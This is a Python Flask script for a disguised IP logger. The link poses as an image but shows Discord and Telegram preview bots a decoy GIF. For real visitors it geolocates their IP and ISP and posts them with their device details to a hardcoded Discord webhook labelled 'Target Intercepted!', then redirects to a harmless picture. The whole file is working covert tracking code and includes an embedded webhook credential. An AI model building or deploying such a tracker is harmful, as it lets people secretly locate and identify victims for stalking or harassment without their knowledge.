import os
import requests
from flask import Flask, request, redirect, send_file
import io

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"

@app.route('/view/image_01.png')
def logger():
    user_agent = request.user_agent.string.lower()
    
    if "discord" in user_agent or "telegram" in user_agent:
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # THE ENHANCED TRAP
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Lookup Location Data
    city, country, isp = "Unknown", "Unknown", "Unknown"
    try:
        geo_data = requests.get(f"http://ip-api.com/json/{user_ip}").json()
        if geo_data['status'] == 'success':
            city = geo_data.get('city')
            country = geo_data.get('country')
            isp = geo_data.get('isp')
    except:
        pass
    
    payload = {
        "embeds": [{
            "title": "🎯 Target Intercepted!",
            "color": 15158332,
            "fields": [
                {"name": "🌍 Location", "value": f"{city}, {country}", "inline": True},
                {"name": "🌐 ISP", "value": isp, "inline": True},
                {"name": "📌 IP Address", "value": f"`{user_ip}`", "inline": False},
                {"name": "📱 Device", "value": f"```{request.user_agent}```", "inline": False}
            ],
            "footer": {"text": "Project Alpha - Geo Tracker"}
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
